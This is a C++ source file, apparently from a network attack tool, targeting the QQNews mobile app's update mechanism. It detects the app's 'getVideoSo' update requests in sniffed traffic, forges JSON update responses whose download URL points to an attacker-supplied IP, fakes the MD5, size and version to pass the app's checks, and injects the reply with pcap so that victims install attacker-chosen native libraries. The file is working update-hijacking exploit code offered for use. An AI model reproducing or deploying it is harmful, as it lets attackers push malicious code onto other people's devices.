


#include <windows.h>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "QQNews.h"
#include "..\\SdkVersion.h"
#include "../version.h"
#include "../HttpUtils.h"
#include "../FileOper.h"



int gSplitFlag = 0;
char * url = "GET /getVideoSo?";
int urllen = lstrlenA(url);

int QQNews::isSplittedPacket(const char * data, int len) {

	if (gSplitFlag  && memcmp(data + len - 4, "\r\n\r\n", 4) == 0 && strstr(data, "\r\nHost: r.inews.qq.com\r\n"))
	{
		gSplitFlag = 0;
		return SPLIT_PACKET_OK;
	}
	else if (memcmp(data,url, urllen) == 0)
	{
		if (memcmp(data + len - 4, "\r\n\r\n", 4) == 0 && strstr(data,"\r\nHost: r.inews.qq.com\r\n"))
		{
			gSplitFlag = 0;
			return WHOLE_PACKET_OK;
		}
		else {
			gSplitFlag = 1;
		}
	}

	return 0;
}

int QQNews::preparePluginRespData(DWORD ulIP, string filepath, string filename,string filename2,string cfgfn) {
	int ret = FALSE;
	char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	char * jsonFormat = 0;
	int formatsize = 0;

	ret = FileOper::fileReader(filepath + cfgfn, &jsonFormat, &formatsize);
	if (ret <= 0)
	{
		return FALSE;
	}

	string szip = HttpUtils::getIPstr(ulIP) + "\\/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);
	if (ret <= 0)
	{
		return FALSE;
	}
	string strmd51 = m_szmd5;
	int filesize1 = m_filesize;
	ret = getUpdateFileMd5(filepath + filename2, TRUE);
	if (ret <= 0)
	{
		return FALSE;
	}
	string strmd52 = m_szmd5;
	int filesize2 = m_filesize;

	int p2pversion = 99999;	// 56270;
	int httpproxyversion = 99999;//56271

	char lpJson[MAX_RESPONSE_HEADER_SIZE];
	int iJsonLen = sprintf_s(lpJson, MAX_RESPONSE_HEADER_SIZE, jsonFormat,
		filesize1,p2pversion,strmd51.c_str(), szip.c_str(), filename.c_str(), 
		filesize2,httpproxyversion,strmd52.c_str(), szip.c_str(),filename2.c_str());

	m_iRespSizeUpdate = sprintf_s(m_lpRespUpdate, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iJsonLen, lpJson);

	return m_iRespSizeUpdate;
}


int QQNews::sendPluginRespData(pcap_t * pcapT, const char * lppacket, int packetsize, char * ip, int type, LPPPPOEHEADER pppoe) {

	int ret = 0;
	if (m_iRespSizeUpdate && m_lpRespUpdate)
	{
		ret = AttackPacket::ReplacePacket(pcapT, lppacket, packetsize, m_lpRespUpdate, m_iRespSizeUpdate, ip, type, pppoe);
	}
	return ret;
}


//{"filename":"video_so.zip","url":"http:\/\/s.inews.gtimg.com\/inewsapp\/QQNews_android\/videoso\/test\/5.6.27\/5.6.27_2\/video_so.zip",
//"md5":"1f0760d214cc2dfee5b8f7a3a479b8e2","version":"1.1.2"}
int QQNews::prepareRespData(DWORD ulIP, string filepath, string filename) {

	//Transfer-Encoding chunked\r\n Content-Encoding: gzip\r\n
	char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	char * jsonFormat =
		"{\"filename\":\"%s\",\"url\":\"http:\\/\\/%s\\/%s\",\"md5\":\"%s\",\"version\":\"%s\",\"other\":\"\"}\r\n";		//\\/dlomg\\/news_so\\/video

	int ret = FALSE;


	string szip = HttpUtils::getIPstr(ulIP) + "\\/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);

	char lpJson[MAX_RESPONSE_HEADER_SIZE];
	int iJsonLen = sprintf_s(lpJson, MAX_RESPONSE_HEADER_SIZE, jsonFormat, filename.c_str(),
		szip.c_str(), filename.c_str(), m_szmd5, QQNEWS_VIDEO_SO_VERSION);

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iJsonLen, lpJson);

	return m_filesize;
}


int QQNews::SetSdkVersion(char * szsdkver, char * lphttphdr, int flag) {

	char sztmpver[MAX_PATH];
	lstrcpyA(sztmpver, szsdkver);
	char * szversions[8] = { 0 };
	int vercnt = SdkVersion::GetSdkVersion(sztmpver, szversions);
	int versions[8] = { 0 };
	for (int i = 0; i < vercnt; i++)
	{
		versions[i] = strtoul(szversions[i], 0, 10);
	}

	char * lphdr = strstr(lphttphdr, ",\"version\":\"");
	char * lpend = lphdr;
	int len = 0;
	if (lphdr) {
		lphdr += lstrlenA(",\"version\":\"");
		lpend = strstr(lphdr, "\"");
		len = lpend - lphdr;
		if (len != lstrlenA(szsdkver))
		{
			string prepversion = string(lphdr, len);
			printf("sdk version size not same,the prepared sdkversion:%s,the sniffered sdkversion:%s\r\n", prepversion.c_str(), szsdkver);
			return FALSE;
		}

		versions[2] ++;

		char sznewver[256];
		int newverlen = wsprintfA(sznewver, "%u.%u.%u", versions[0], versions[1], versions[2]);
		printf("request version:%s,response version:%s\r\n", szsdkver, sznewver);
		memmove(lphdr, sznewver, newverlen);

		return TRUE;
	}
	return FALSE;
}


/*
int QQNews::prepareUpdateRespData(DWORD ulIP, string filepath, string filename) {

	char * jsonFormat =
		"QZOutputJson = { \"s\":\"o\",\"t\" : %u,\"ip\" : \"125.120.212.166\",\"pos\" : \"......-.........-.........-......\",\"rand\" : \"4UEVEYwXXth_iabQ1Bu-oQ==\" };";

	char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/x-javascript\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	int ret = FALSE;


	char szip[MAX_PATH] = { 0 };
	unsigned char cip[4] = { 0 };

	memmove(cip, &ulIP, 4);
	ret = wsprintfA(szip, "%u.%u.%u.%u", cip[0], cip[1], cip[2], cip[3]);

	ret = getUpdateFileMd5(filepath + filename);

	char lpJson[MAX_RESPONSE_HEADER_SIZE];
	int iJsonLen = sprintf_s(lpJson, MAX_RESPONSE_HEADER_SIZE, jsonFormat, szip.c_str(), filename.c_str(), szmd5, QQNEWS_VIDEO_SO_VERSION);

	iRespSize = sprintf_s(lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iJsonLen, lpJson);

	return filesize;
}

*/
